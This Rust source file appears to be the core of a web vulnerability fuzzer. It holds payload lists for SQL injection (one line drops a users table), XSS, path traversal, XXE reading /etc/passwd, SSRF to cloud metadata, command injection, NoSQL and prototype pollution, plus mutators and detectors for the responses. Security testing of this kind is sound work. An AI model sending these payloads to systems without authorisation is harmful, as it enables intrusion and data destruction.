//! Core fuzzing logic: no `tokio`, no `reqwest`. Safe to compile for `wasm32-unknown-unknown`
//! and load in Cloudflare Workers / Lambda@Edge as a WASM module.

pub const USER_AGENT: &str =
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 WeissmanFuzzCore/1.0";

pub const BASELINE_REQUESTS: usize = 3;
pub const RATE_LIMIT_DELAY_MS: u64 = 200;
pub const TIME_ANOMALY_MULTIPLIER: f64 = 5.0;
pub const LENGTH_ANOMALY_RATIO: f64 = 2.0;

pub static DANGEROUS_SUFFIXES: &[&str] = &[
    // Null byte / encoding
    "%00",
    "\\x00",
    // SQL injection
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    // XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    // Path traversal / LFI
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    // SSTI (Server-Side Template Injection)
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "${{<%[%'\"}}%\\",
    // XXE (XML External Entity)
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    // SSRF probes (safe: loopback / metadata endpoint patterns)
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://[::1]/",
    // Command injection
    "; id",
    "| id",
    "`id`",
    "$(id)",
    // NoSQL injection
    "{\"$gt\": \"\"}",
    "{\"$where\": \"1==1\"}",
    // Null byte / encoding
    "\u{0000}",
    // CRLF injection (header splitting)
    "\r\nX-Injected: weissman",
    "%0d%0aX-Injected:%20weissman",
];

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct Baseline {
    pub avg_latency_ms: f64,
    pub status: u16,
    pub content_length: usize,
}

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct ValidatedAnomaly {
    pub target_url: String,
    pub payload: String,
    pub anomaly_type: String,
    pub baseline_vs_anomaly: String,
    /// Set when anomaly was confirmed via out-of-band / OAST callback correlation.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub oob_token: Option<String>,
    /// vLLM user prompt that produced this payload (generative fuzzing provenance).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub llm_user_prompt: Option<String>,
}

#[derive(Clone, Debug)]
pub struct Mutator {
    base: String,
}

impl Mutator {
    pub fn new(base: impl Into<String>) -> Self {
        Self { base: base.into() }
    }

    pub fn base(&self) -> &str {
        &self.base
    }

    pub fn bit_flip(&self) -> String {
        let mut bytes: Vec<u8> = self.base.as_bytes().to_vec();
        if bytes.is_empty() {
            return self.base.clone();
        }
        let i = bytes.len() / 2;
        bytes[i] = bytes[i].wrapping_add(1);
        String::from_utf8_lossy(&bytes).into_owned()
    }

    pub fn byte_swap(&self) -> String {
        let mut bytes: Vec<u8> = self.base.as_bytes().to_vec();
        if bytes.len() < 2 {
            return self.base.clone();
        }
        let i = bytes.len() / 2;
        let j = (i + 1).min(bytes.len() - 1);
        bytes.swap(i, j);
        String::from_utf8_lossy(&bytes).into_owned()
    }

    pub fn dangerous_suffix(&self, index: usize) -> String {
        let s = DANGEROUS_SUFFIXES
            .get(index % DANGEROUS_SUFFIXES.len())
            .unwrap_or(&"'");
        format!("{}{}", self.base, s)
    }

    pub fn massive_length(&self, count: usize) -> String {
        let pad = "A".repeat(count.min(100_000));
        format!("{}{}", self.base, pad)
    }

    pub fn mutations(&self) -> Vec<String> {
        let mut out = Vec::new();
        out.push(self.base.clone());
        out.push(self.bit_flip());
        out.push(self.byte_swap());
        for i in 0..DANGEROUS_SUFFIXES.len() {
            out.push(self.dangerous_suffix(i));
        }
        out.push(self.massive_length(10_000));
        out.push(self.massive_length(50_000));
        out
    }

    /// Structure-aware variants (JSON body or `application/x-www-form-urlencoded` style).
    #[must_use]
    pub fn smart_mutations(&self) -> Vec<String> {
        smart_payload_mutations(&self.base)
    }
}

/// Heuristic JSON / form-aware mutations (keeps parseable structure where possible).
#[must_use]
pub fn smart_payload_mutations(base: &str) -> Vec<String> {
    let t = base.trim();
    if t.starts_with('{') && t.ends_with('}') {
        return smart_json_object_mutations(t);
    }
    if t.starts_with('[') && t.ends_with(']') {
        return smart_json_array_mutations(t);
    }
    if looks_like_form_urlencoded(t) {
        return smart_form_urlencoded_mutations(t);
    }
    Vec::new()
}

fn looks_like_form_urlencoded(s: &str) -> bool {
    if !s.contains('=') || s.starts_with('{') {
        return false;
    }
    let sample: String = s.chars().take(2048).collect();
    !sample.contains('\n') && sample.split('&').take(5).all(|p| {
        p.split_once('=')
            .map(|(k, _)| !k.trim().is_empty())
            .unwrap_or(false)
    })
}

fn smart_json_object_mutations(json_str: &str) -> Vec<String> {
    let Ok(mut v) = serde_json::from_str::<serde_json::Value>(json_str) else {
        return Vec::new();
    };
    let Some(obj) = v.as_object_mut() else {
        return Vec::new();
    };
    let keys: Vec<String> = obj.keys().cloned().collect();
    let mut out = Vec::new();

    for k in &keys {
        let Some(orig) = obj.get(k).cloned() else {
            continue;
        };
        if let Some(s) = orig.as_str() {
            let mut m = obj.clone();
            m.insert(
                k.clone(),
                serde_json::Value::String(format!("{s}' OR '1'='1")),
            );
            if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m.clone())) {
                out.push(s2);
            }
            m.insert(
                k.clone(),
                serde_json::Value::String(format!(
                    "<svg onload=alert('{}')>",
                    XSS_REFLECTION_TOKEN
                )),
            );
            if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                out.push(s2);
            }
        }
    }

    let mut proto = obj.clone();
    proto.insert(
        "__proto__".to_string(),
        serde_json::json!({"polluted": true, "admin": true}),
    );
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(proto)) {
        out.push(s);
    }

    let mut ctor = obj.clone();
    ctor.insert(
        "constructor".to_string(),
        serde_json::json!({"prototype": {"isAdmin": true}}),
    );
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(ctor)) {
        out.push(s);
    }

    let mut nosql = obj.clone();
    nosql.insert("$where".to_string(), serde_json::json!("1==1"));
    nosql.insert("$gt".to_string(), serde_json::json!(""));
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(nosql)) {
        out.push(s);
    }

    out.sort();
    out.dedup();
    out
}

fn smart_json_array_mutations(json_str: &str) -> Vec<String> {
    let Ok(arr) = serde_json::from_str::<Vec<serde_json::Value>>(json_str) else {
        return Vec::new();
    };
    if arr.is_empty() {
        return vec![format!("[\"' OR '1'='1\"]")];
    }
    let mut out = Vec::new();
    for (i, item) in arr.iter().enumerate() {
        if item.is_string() {
            let mut c = arr.clone();
            c[i] = serde_json::Value::String(format!(
                "{}' OR '1'='1",
                item.as_str().unwrap_or("")
            ));
            if let Ok(s) = serde_json::to_string(&c) {
                out.push(s);
            }
        }
    }
    out
}

fn smart_form_urlencoded_mutations(form: &str) -> Vec<String> {
    let mut pairs: Vec<(String, String)> = Vec::new();
    for seg in form.split('&') {
        if let Some((k, v)) = seg.split_once('=') {
            let key = urlencoding::decode(k).unwrap_or_else(|_| k.into()).to_string();
            let val = urlencoding::decode(v).unwrap_or_else(|_| v.into()).to_string();
            pairs.push((key, val));
        }
    }
    if pairs.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for i in 0..pairs.len() {
        let mut c = pairs.clone();
        c[i].1 = format!("{}' OR '1'='1", c[i].1);
        out.push(encode_form_pairs(&c));
        let mut c2 = pairs.clone();
        c2[i].1 = format!(
            "<svg onload=alert('{}')>",
            XSS_REFLECTION_TOKEN
        );
        out.push(encode_form_pairs(&c2));
    }
    out.sort();
    out.dedup();
    out
}

fn encode_form_pairs(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| {
            format!(
                "{}={}",
                urlencoding::encode(k),
                urlencoding::encode(v)
            )
        })
        .collect::<Vec<_>>()
        .join("&")
}

pub fn is_anomaly(
    baseline: &Baseline,
    status: u16,
    content_length: usize,
    latency_ms: f64,
) -> Option<String> {
    if status == 500 {
        return Some("Status 500 (Internal Server Error / Crash)".to_string());
    }
    if baseline.avg_latency_ms > 0.0
        && latency_ms >= baseline.avg_latency_ms * TIME_ANOMALY_MULTIPLIER
    {
        return Some(format!(
            "Response time anomaly ({} ms vs baseline ~{} ms)",
            latency_ms as u64, baseline.avg_latency_ms as u64
        ));
    }
    let base_len = baseline.content_length.max(1);
    if content_length >= (base_len as f64 * LENGTH_ANOMALY_RATIO) as usize
        || (base_len > 100 && content_length < base_len / 4)
    {
        return Some(format!(
            "Content-Length anomaly ({} vs baseline ~{})",
            content_length, baseline.content_length
        ));
    }
    None
}

/// Common reflectable parameter names for injection probes (GET).
pub static INJECTION_PARAM_NAMES: &[&str] = &[
    "id", "q", "query", "search", "s", "keyword", "name", "user", "username", "email", "page",
    "sort", "order", "filter", "cat", "category", "file", "path", "url", "redirect", "next",
    "callback", "token",
];

/// SQL error / boolean-style probes (encoded by `append_query_param`).
pub static SQLI_PROBE_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "1; SELECT pg_sleep(0)--",
];

/// Unique token embedded in XSS probes to detect reflection without executing script in our checker.
pub const XSS_REFLECTION_TOKEN: &str = "weissman_xss_prb_9f3a";

/// Builds GET URLs with synthetic query parameters for injection testing (capped).
#[must_use]
pub fn build_param_injection_probe_urls(base_url: &str, max_urls: usize) -> Vec<String> {
    let mut out = Vec::new();
    let base = base_url.trim();
    if base.is_empty() {
        return out;
    }
    let xss_payloads = [
        format!("<svg onload=alert('{}')>", XSS_REFLECTION_TOKEN),
        format!(
            "\"><img src=x onerror=alert('{}')>",
            XSS_REFLECTION_TOKEN
        ),
        format!("'><script>{}</script>", XSS_REFLECTION_TOKEN),
    ];
    for param in INJECTION_PARAM_NAMES {
        for payload in SQLI_PROBE_PAYLOADS {
            if out.len() >= max_urls {
                return out;
            }
            out.push(append_query_param(base, param, payload));
        }
        for xss in &xss_payloads {
            if out.len() >= max_urls {
                return out;
            }
            out.push(append_query_param(base, param, xss));
        }
    }
    out
}

#[must_use]
pub fn looks_like_sqli_response(body: &str) -> bool {
    let b = body.to_lowercase();
    b.contains("sql syntax")
        || b.contains("mysql")
            && (b.contains("error in your sql") || b.contains("mysqli"))
        || b.contains("postgresql") && b.contains("error")
        || b.contains("sqlite")
            && (b.contains("syntax error") || b.contains("sqlite3"))
        || b.contains("ora-")
        || b.contains("microsoft ole db")
        || b.contains("odbc sql server driver")
        || b.contains("unclosed quotation mark")
        || b.contains("quoted string not properly terminated")
}

#[must_use]
pub fn reflected_xss_indicated(body: &str) -> bool {
    body.contains(XSS_REFLECTION_TOKEN)
}

pub fn append_query_param(base_url: &str, param: &str, value: &str) -> String {
    let encoded = urlencoding::encode(value);
    if base_url.contains('?') {
        format!("{}&{}={}", base_url, param, encoded)
    } else {
        format!("{}?{}={}", base_url, param, encoded)
    }
}

/// Load AI-guided payloads (native only). WASM callers pass payloads from JS/host.
#[cfg(not(target_arch = "wasm32"))]
pub fn load_guided_payloads_from_file(path: &str) -> Vec<String> {
    use std::io::BufRead;
    let mut out = Vec::new();
    if let Ok(f) = std::fs::File::open(path) {
        for s in std::io::BufReader::new(f).lines().map_while(Result::ok) {
            let s = s.trim().to_string();
            if !s.is_empty() {
                out.push(s);
            }
        }
    }
    out
}

#[cfg(target_arch = "wasm32")]
pub fn load_guided_payloads_from_file(_path: &str) -> Vec<String> {
    Vec::new()
}

/// Merge guided payloads, structure-aware smart mutations, and byte-level mutator variants (deduped).
pub fn resolve_mutations(mutator: &Mutator, guided: &[String]) -> Vec<String> {
    let smart = mutator.smart_mutations();
    let classic = mutator.mutations();
    let mut seen = std::collections::HashSet::<String>::new();
    let mut out = Vec::new();
    for s in guided
        .iter()
        .map(String::as_str)
        .chain(smart.iter().map(String::as_str))
        .chain(classic.iter().map(String::as_str))
    {
        let owned = s.to_string();
        if seen.insert(owned.clone()) {
            out.push(owned);
        }
    }
    out
}

/// WASM export: build mutation list from base string (no filesystem).
#[cfg(target_arch = "wasm32")]
#[no_mangle]
pub extern "C" fn fuzz_core_wasm_abi_version() -> u32 {
    1
}
